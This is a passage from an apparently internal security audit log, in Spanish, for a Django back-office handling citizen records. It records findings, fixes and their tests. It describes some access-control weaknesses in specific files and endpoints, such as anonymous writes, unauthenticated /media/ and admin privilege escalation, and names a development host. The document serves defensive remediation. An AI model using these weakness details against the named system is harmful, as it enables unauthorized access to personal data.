navegador mide mouse y teclado y el del servidor mide **pedidos**, así que veinte minutos tipeando un
relevamiento largo terminaban en el login con el formulario perdido. `idle-logout.js` manda un latido
(`POST /sesion/latido/`) como mucho una vez por minuto y **solo** con actividad real, y el servidor
corta recién a los `SESSION_IDLE_TIMEOUT_MINUTES` + 60 s de margen, para no cortar antes que el aviso de
la pantalla. La marca se reescribe como mucho una vez por minuto y se deja puesta en el `login`, así que
no agrega consultas por request ni mueve los presupuestos. **Falta (ECOM):** `proxy_set_header
X-Forwarded-Host $host` en nginx/ingress, con `USE_X_FORWARDED_HOST=True` (H-09). **Test permanente:**
`core.tests.test_sesion_inactividad` (13: expira, no expira dentro de la ventana, el margen, el latido,
la API con Token no expira, el timeout 0 apaga todo, una sesión vieja sin marca no se cae, y las dos
cookies evaluando `config/settings.py` con `DEBUG=False` y sin `ENVIRONMENT`).

### SEC-36 · `programa_list` sin capacidad; errores internos al usuario
**Severidad:** BAJA · **Estado:** CONFIRMADO (lectura) · **Origen:** A5-39 (parte; el `run_phase2_tests_api` va en OPS-10), G1b-10 (texto crudo) · **Ola:** 2 · **Esfuerzo:** S
- **Ubicación:** `configuracion/views/programas.py:52-53` (`programa_list` solo `login_required`); `users/views/admin.py:77-80`, `:137-140` (`f"Error al guardar el usuario: {exc}"`); `core/views/performance.py` (`str(e)`).
- **Propuesta:** `@requiere("programa.configurar", "config.ver")` en `programa_list`; mensajes genéricos + `logger.exception`.

**Resolución:** ✅ Resuelto en #640 (Cambio 185, Ola 2 PR 8), 08-oct-2026 — `programa_list` pide
`rbac.CAPS_ENTRADA_PROGRAMAS` (`programa.configurar`, `config.ver`, `config.administrar`: las tres que ya
existen para esa pantalla, ninguna nueva). **Esto sí le saca la pantalla a cuatro de los cinco roles de
menú de `seed_datos_base`:** el único que conserva `/configuracion/programas/` es **Configuración**
(tiene `config.ver` y `config.administrar`); **Dashboard** (`dashboard.ver`), **Gestión de Ciudadanos**
(las seis de `ciudadano.*`), **Reportes** (`reporte.ver`) y **Administración** (`usuario.administrar`,
`rol.administrar`) lo pierden, porque hasta ahora entraban por el solo hecho de estar logueados —que es
el hallazgo—. Quien necesite el catálogo con uno de esos cuatro roles lleva además alguna de las tres
capacidades, o se le tilda. El acceso del inicio se esconde con el mismo criterio, derivado de la misma
constante (`core/templatetags/rbac.py::puede_ver_programas`): ofrecer un acceso que después rebota es
peor que no ofrecerlo. Los `f"Error al guardar el usuario: {exc}"` del ABM y los tres `str(e)` de
`core/views/performance.py` pasan a un mensaje genérico con `logger.exception`. **Dos efectos colaterales
medidos:** `/configuracion/programas/` salió de la allowlist del barrido sin rol (RED-89) y `config.ver`
salió de `CAPACIDADES_SIN_USO` —el ratchet de RED-44 lo pidió solo: ahora hay una pantalla que la
evalúa—. El rebote de un usuario sin ninguna capacidad desde el wizard queda en dos saltos (paso →
listado → inicio), que es lo que ajustan dos tests de `configuracion`. `run_phase2_tests_api` sigue
siendo de OPS-10. **Test permanente:** `core.tests.test_bajos_ola2.CatalogoDeProgramasTests` (6) y
`.ErroresInternosDelAbmTests.test_el_alta_no_le_muestra_el_error_interno_al_operador`.

### SEC-37 · Link público, paso 2: muestra nombre y fecha de nacimiento a partir de DNI + sexo
**Severidad:** BAJA (riesgo aceptado: RN-P7 y Cambio 71) · **Estado:** CONFIRMADO · **Origen:** A5-43 · **Ola:** 2 · **Esfuerzo:** S · **Decisión:** D-37
- **Ubicación:** `portal/views/inscripcion.py:126-137`, `:188-195`; `portal/templates/portal/inscripcion/paso2.html:25-26`. Mitigaciones existentes: captcha, cubeta por IP (10/10 min), por DNI (15/h), vigencia 45 min.
- **Propuesta:** si el PM reabre el Cambio 71: nombre enmascarado. En todo caso exigir reCAPTCHA real en `prd` (SIIS-21).

**Resolución:** ✅ Resuelto en #640 (Cambio 185, Ola 2 PR 8), 08-oct-2026, con **D-37 = No**: el
Cambio 71 no se reabre —el paso 2 sigue mostrando nombre y fecha de nacimiento a partir de DNI + sexo— y
la contrapartida acordada, el captcha real en producción, pasa de **aviso a error**: el `core.W003` que
dejó SIIS-21 es ahora `core.E005` y `manage.py check --deploy` **termina en rojo** en producción sin
`RECAPTCHA_SITE_KEY`/`RECAPTCHA_SECRET_KEY`. Un aviso no exigía nada. El disparador sigue siendo
`DATANACH_ES_PRODUCCION`, la variable que ECOM setea solo en PRD, así que dev, QA, los tests y el CI no
se rompen: ahí el desafío aritmético es a propósito. **Test permanente:**
`core.tests.test_checks_entorno.ChecksDeEntornoTests.test_el_captcha_aritmetico_en_produccion_es_error`
(y sus dos hermanos: con claves no dice nada, fuera de producción tampoco).

### G1c-10 · `/admin/` y `admin/doc/` montados en todos los entornos
**Severidad:** BAJA (baja desde MEDIA) · **Estado:** CONFIRMADO-AJUSTADO (mayormente duplicado de DAT-02 y SEC-26) · **Origen:** G1c-10 · **Ola:** 2 · **Esfuerzo:** S
- **Ubicación:** `config/urls.py:25-26` (`admin/` y `admin/doc/` en todos los entornos); `users/admin.py:9-33` (un `UserAdmin` estándar deja a un staff con `change_user` tildar `is_superuser`; hoy no existe ese staff: ningún flujo pone `is_staff`).
- **Propuesta:** quitar `admin/doc/`; en `UserAdmin`, `readonly_fields` = `is_superuser`, `groups`, `user_permissions` para no superusuarios; restringir `/admin/` por IP (SEC-26); `has_delete_permission` en DAT-02.

**Resolución:** 🟡 Parcial en #640 (Cambio 185, Ola 2 PR 8), 08-oct-2026 — lo que es código.
`admin/doc/` salió de `config/urls.py`: publicaba el índice de modelos, vistas, templates y tags del
proyecto, con sus docstrings, a cualquier `is_staff`, no lo enlazaba ninguna pantalla y no lo usa nadie.
Y `OptimizedUserAdmin.get_readonly_fields` deja en solo lectura `is_superuser`, `is_staff`, `groups` y
`user_permissions` para quien no sea superusuario —`is_staff` se suma a la lista de la ficha porque es
la llave de esta misma pantalla—. Hoy no existe la cuenta que lo explotaba (ningún flujo pone
`is_staff`) y de eso es de lo que deja de depender. **Falta, y no es código:** restringir `/admin/` por
IP en nginx/ingress, que es el punto 6 de SEC-26 y va con el PM. **Test permanente:**
`core.tests.test_bajos_ola2.AdminDeDjangoTests` (4).

### G1c-16 · Payload crudo de RENAPER en sesión (24 h) y caché (10 min)
**Severidad:** BAJA · **Estado:** CONFIRMADO (lectura) · **Origen:** G1c-16 · **Ola:** 2 · **Esfuerzo:** S
- **Ubicación:** `legajos/services/ciudadanos.py:27-29` (guarda `datos_api` crudo en la sesión, Redis en prd, hasta confirmar o abandonar); `legajos/services/consulta_renaper.py:360-372`, `:489` (caché 10 min); `legajos/views/ciudadanos.py:185`.
- **Propuesta:** lista blanca de campos en sesión; no cachear `datos_api`; limpiar la sesión en el GET de `ciudadano_nuevo`.

**Resolución:** ✅ Resuelto en #640 (Cambio 185, Ola 2 PR 8), 08-oct-2026 — las tres, con una sola
lista blanca aplicada **en el origen**: `consulta_renaper.datos_api_mostrables()` recorta el payload a
los nueve campos que dibuja `ciudadano_confirmar_form.html` (apellido, nombres, fechaNacimiento, calle,
número, piso, departamento, ciudad, provincia), así que ni la caché de 10 min ni la sesión de 24 h
llegan a ver el resto de lo que mande el organismo. `store_renaper_data` vuelve a aplicarla —la sesión
es donde el dato vive más tiempo: que el recorte no dependa de por dónde entró— y el GET de
`ciudadano_nuevo` borra lo que haya quedado de una consulta anterior: quien consultaba y se arrepentía
dejaba el nombre, la fecha de nacimiento y el domicilio de esa persona guardados un día entero.
**Desvío de la propuesta:** «no cachear `datos_api`» se resolvió cacheando **el recorte** en vez de
sacar la clave, porque sacarla hacía que la segunda consulta del mismo DNI dentro de los 10 min dibujara
la pantalla sin el panel «Datos de RENAPER». **Test permanente:**
`legajos.tests.test_renaper_tls_y_payload.DatosApiMostrablesTests` y `.SesionDelAltaTests` (en la sesión
no queda el payload entero, la pantalla sigue mostrando lo suyo, volver al alta borra la consulta).

## Seguimientos de la revisión de la Ola 0 (agregados el 03-oct-2026)

Observaciones MINOR que dejaron los revisores de los PRs de la Ola 0. No son de la base auditada (`917e583`):
las líneas son de `origin/development @ 7393c41`.

### R0-01 · `/conversaciones/<id>/evaluar/` acepta escritura anónima
**Severidad:** BAJA (MINOR del revisor) · **Estado:** CONFIRMADO (lectura) · **Origen:** revisión de la Ola 0 · **Ola:** 0 · **Esfuerzo:** S

**Resolución:** ✅ Resuelto en #537 (Cambio 111), 03-oct-2026 — ruta `<id>/evaluar/` desmontada (default «desmontar», sin consumidor). Se borró la cadena entera: `conversaciones/views/public.py`, la `evaluar_conversacion` homónima del backoffice (la pública la tapaba por orden de import), `EvaluarConversacionForm` y el servicio. `Conversacion.satisfaccion` y sus métricas quedan. Tests en `conversaciones/tests/test_public.py`.
- **Ubicación:** `conversaciones/urls.py:21` → `conversaciones/views/public.py:29` (`evaluar_conversacion`, sin `login_required` ni dueño).
- **Escenario:** un anónimo con la cookie CSRF hace `POST /conversaciones/<n>/evaluar/` con `{"satisfaccion": …}` y pisa la evaluación de cualquier conversación por id. Lo dejó el revisor de #510 (G1-01) como MINOR: no expone datos, pero es la última escritura anónima de la app.
- **Propuesta:** desmontar la ruta (el chat público que la usaba ya no existe) o exigir `login_required` + permiso de conversaciones; se resuelve también con la fase 2 de G1-01.
- **Test:** `POST` anónimo a `/conversaciones/<id>/evaluar/` → 404 (o 302) y la conversación sin cambios.

### R0-05 · `DEFAULT_THROTTLE_RATES["renaper"]` sin consumidor
**Severidad:** BAJA (MINOR del revisor) · **Estado:** CONFIRMADO (lectura) · **Origen:** revisión de la Ola 0 · **Ola:** 2 (con SEC-25) · **Esfuerzo:** incluido en SEC-25
- **Ubicación:** `config/settings.py:421`. El único consumidor era `RenaperRateThrottle`, borrado con SEC-04 (#509).
- **Propuesta:** usarla en el throttle de `consultar_persona_becas` (SEC-25) o borrarla.

**Resolución:** ✅ Resuelta en #638 (Cambio 184), 08-10-2026, junto con SEC-25 — se borró y la
reemplaza `"personas_campo": "120/hour"`, que sí tiene consumidor. **Test permanente:**
`programas.tests.test_becas_api.ConsultaDePersonasConThrottleTests.test_la_tasa_configurada_es_la_de_d25`.

## Seguimientos de la revisión de la Ola 0, segunda tanda (agregados el 03-oct-2026)

Observaciones MINOR de los revisores de #536-#542 y seguimientos operativos. Las líneas son de
`origin/development @ 719dc0a`.

### R0b-04 · `retrieve` de `/api/legajos/ciudadanos/<pk>/` da 404 sin `?search=`
**Severidad:** BAJA (MINOR del revisor de #542) · **Estado:** CONFIRMADO (lectura) · **Origen:** revisión de la Ola 0, 2ª tanda · **Ola:** 2 (PR 3, Legajos) · **Esfuerzo:** S
- **Ubicación:** `legajos/api_views/__init__.py:49-59` (`get_queryset` devuelve `none()` con menos de 3 caracteres de `?search=`, también en `retrieve`).
- **Escenario:** `GET /api/legajos/ciudadanos/<pk>/` con `ciudadano.ver` → 404 aunque el ciudadano exista. Hoy no hay consumidor (el único es el `?search=` de `ciudadano_detail.html`), pero el 404 engaña a quien lo use después.
- **Propuesta:** decidirlo y dejarlo explícito: aplicar el mínimo de búsqueda solo si `self.action == "list"`, o sacar `retrieve` del ViewSet (`mixins.ListModelMixin` + `GenericViewSet`) para que la ruta no exista.
- **Test:** `retrieve` con `ciudadano.ver` → 200 (o ruta inexistente), sin capacidad → 403.

**Resolución:** ✅ Resuelto en #629 (Cambio 179), 08-oct-2026 - el mínimo de búsqueda se aplica solo si
`self.action == "list"`, que es la acción que enumera; `retrieve` necesita el pk, así que no habilita ninguna
enumeración y deja de dar 404 sobre un ciudadano que existe. **Test permanente:**
`legajos.tests.test_api_ciudadanos_rbac.ApiCiudadanosRetrieveYOrdenTests.test_retrieve_con_ciudadano_ver_200`
(y `test_el_listado_sigue_pidiendo_tres_caracteres`, que fija que el mínimo de SEC-02 no se aflojó).

### R0b-05 · `CiudadanoViewSet` declara `ordering` sin `OrderingFilter`: pagina sin orden estable
**Severidad:** BAJA (MINOR del revisor de #542) · **Estado:** CONFIRMADO (lectura) · **Origen:** revisión de la Ola 0, 2ª tanda · **Ola:** 2 (PR 3, Legajos) · **Esfuerzo:** incluido en R0b-04
- **Ubicación:** `legajos/api_views/__init__.py:43-47` (`filter_backends = [DjangoFilterBackend, filters.SearchFilter]`; `ordering_fields`/`ordering` solo los lee `OrderingFilter`).
- **Propuesta:** sumar `filters.OrderingFilter` a `filter_backends` (o `.order_by("apellido", "nombre", "pk")` en `get_queryset`) para que la paginación sea determinística.
- **Test:** dos páginas consecutivas de una búsqueda no repiten ni saltean filas.

**Resolución:** ✅ Resuelto en #629 (Cambio 179), 08-oct-2026 - `filters.OrderingFilter` entra a
`filter_backends` y `ordering` pasa a `["apellido", "nombre", "pk"]`: sin el desempate por `pk`, dos homónimos no
tienen orden propio y el motor puede devolverlos distinto en cada página (y MariaDB y MySQL no tienen qué
coincidir). **Test permanente:**
`legajos.tests.test_api_ciudadanos_rbac.ApiCiudadanosRetrieveYOrdenTests.test_dos_paginas_no_repiten_ni_saltean`.

### R0b-06 · `AlertasViewSet` sin capacidad decidida
**Severidad:** BAJA (MINOR del revisor de #542) · **Estado:** CONFIRMADO (lectura) · **Origen:** revisión de la Ola 0, 2ª tanda · **Ola:** 2 (con SEC-18) · **Esfuerzo:** incluido en SEC-18
- **Ubicación:** `legajos/api_views/__init__.py:65-72` (`permission_classes = [BackofficeAutenticado, IsAuthenticated]`; el queryset ya sale de `FiltrosUsuarioService`).
- **Propuesta:** `RequiereCapacidad("ciudadano.ver")` para `list`/`count` y la que fije D-11 para el contenido de la alerta; `cerrar` con `get_object()` (SEC-18). Mismo criterio que `alertas_criticas` (SEC-14).
- **Test:** sin capacidad → 403 en `list`, `count` y `cerrar`.

**Resolución:** ✅ Resuelto en #556 (Cambio 126, PR R-19), 04-oct-2026 — junto con SEC-18, en el mismo PR:
`permission_classes = [BackofficeAutenticado, RequiereCapacidad("ciudadano.ver")]` y `cerrar` con `self.get_object()`.
Subir la capacidad a `ciudadano.sensible` para el **contenido** de la alerta queda atado a D-11, igual que las tres
vistas de SEC-11. **Test permanente:** `legajos.tests.test_alertas_rbac.AlertasApiTests`.

### R0b-07 · `config/urls.py` monta `/media/` abierto con `DEBUG=True` antes del bloque `SERVE_MEDIA`
**Severidad:** BAJA (MINOR del revisor de #538) · **Estado:** CONFIRMADO (lectura) · **Origen:** revisión de la Ola 0, 2ª tanda · **Ola:** 2 (PR 7, Media) · **Esfuerzo:** S
- **Ubicación:** `config/urls.py:67` (`urlpatterns += static(settings.MEDIA_URL, ...)`, sin login, activo con `DEBUG=True`) antes de `:72-81` (`login_required(_media_serve)`). Con los dos activos gana el primero.
- **Escenario:** un ambiente con `DEBUG=True` y `SERVE_MEDIA=True` sirve `/media/` sin sesión.
- **Propuesta:** no registrar `static(MEDIA_URL)` cuando `SERVE_MEDIA=True` (o nunca: usar siempre la ruta con login, también en dev); en la etapa 2 de SEC-09 la reemplaza `media_protegida`.
- **Test:** con `DEBUG=True` y `SERVE_MEDIA=True`, anónimo → 302.

### R0b-08 · Comentarios que todavía dicen que nginx sirve `/media/`
**Severidad:** BAJA (MINOR del revisor de #538) · **Estado:** CONFIRMADO (lectura) · **Origen:** revisión de la Ola 0, 2ª tanda · **Ola:** 2 (PR 7, Media) · **Esfuerzo:** incluido en R0b-07
- **Ubicación:** `.env.qa.example:77-79` («en la VM lo sirve nginx y esto queda en False»: falso desde #538, la VM usa `SERVE_MEDIA=True`); también `docs/client/architecture.md:203` («excepto `/static/` y `/media/`»: el middleware ya no exime `/media/`; ese mismo párrafo es el de R0-02).
- **Propuesta:** reescribir los dos textos según SEC-09 etapa 1.

### R0b-09 · `actividad_reciente` pide `ciudadano.sensible` pero muestra inscripciones y derivaciones sin alcance
**Severidad:** BAJA (MINOR del revisor de #541) · **Estado:** CONFIRMADO (lectura) · **Origen:** revisión de la Ola 0, 2ª tanda · **Ola:** 2 (PR 3, Legajos) · **Esfuerzo:** S
- **Ubicación:** `dashboard/api_views/__init__.py:135-146` (`@permission_classes([BackofficeAutenticado, RequiereCapacidad("ciudadano.sensible")])`; `InscripcionPrograma.objects…` y `DerivacionPrograma.objects…` globales; solo las alertas pasan por `FiltrosUsuarioService`).
- **Escenario:** la capacidad no corresponde al contenido: quien tiene `ciudadano.sensible` ve las últimas inscripciones y derivaciones de todos los programas, y quien solo tiene `ciudadano.ver` no ve nada.
- **Propuesta:** separar por tipo de evento: inscripciones y derivaciones con `ciudadano.ver` (acotadas como en SEC-12/D-12), alertas con `ciudadano.sensible` (D-11); o partir el feed en dos endpoints.
- **Test:** con `ciudadano.ver` solo, el feed trae inscripciones y no alertas; sin capacidad → 403.

**Resolución:** 🟡 Resuelta **la mitad del alcance** en #629 (Cambio 179), 08-oct-2026 - las inscripciones y
derivaciones salen por `FiltrosUsuarioService.acotar_a_programas_del_usuario` (helper nuevo, mismo alcance que
ya usan las alertas: los programas de los legajos propios; superusuario y `config.administrar` ven todo), así
que el feed dejó de mostrar movimientos de programas ajenos. **Test permanente:**
`dashboard.tests.test_api_rbac.ActividadRecienteAlcanceTests` (en particular
`test_con_ciudadano_sensible_trae_lo_de_su_alcance_y_nada_ajeno` y `test_config_administrar_ve_todo`).

**Pendiente — la mitad de la capacidad.** La ronda 1 del PR había bajado el endpoint a
`RequiereCapacidad("ciudadano.ver")` dejando la rama de alertas detrás de `ciudadano.sensible`. La ronda 3 lo
devolvió a `ciudadano.sensible`: **el PR era de endurecimiento y no tenía que darle acceso nuevo a nadie**. Con
`ciudadano.ver` el feed se abría a roles que hoy no lo ven y, en particular, un rol con `config.administrar` y
sin `ciudadano.sensible` —que `acotar_a_programas_del_usuario` trata como alcance global— pasaba a ver las
inscripciones y derivaciones de **todo el sistema**. Nada se rompe por volver: es la capacidad que el endpoint
pedía antes del PR. Lo que queda abierto es la mitad original de la ficha —que quien solo tiene `ciudadano.ver`
siga sin ver nada del feed—, y resolverlo bien es partir el endpoint en dos (inscripciones/derivaciones con
`ciudadano.ver`, alertas con `ciudadano.sensible`) o sacar la rama de alertas del feed. Va a una ola posterior,
con decisión del PM sobre qué ve el «Operador de backoffice» en el inicio.

### R0b-11 · Desplegar SEC-09 etapa 1 en icore-srv (operativo, PM)
**Severidad:** — (operativo, sin código) · **Origen:** #538 (Cambio 112) · **Ola:** PM · **Esfuerzo:** —
- **Qué:** hasta desplegarlo, DEV (`relevamiento-deshum.ecomdev.ar`) sigue sirviendo `/media/` por nginx sin login y con `expires 7d`.
- **Orden:** pull → build y recrear **`web` primero** (con `SERVE_MEDIA=True`) → después `nginx` (el gotcha de IP cacheada obliga a reiniciarlo igual). Si `nginx` va antes, `/media/` cae en Django sin la ruta y los adjuntos dan 404.
- **Verificación:** `curl -I https://relevamiento-deshum.ecomdev.ar/media/<ruta_conocida>` sin cookie → 302; con sesión de backoffice → 200. Los archivos que ya bajó alguien pueden seguir en cachés de navegador hasta 7 días.
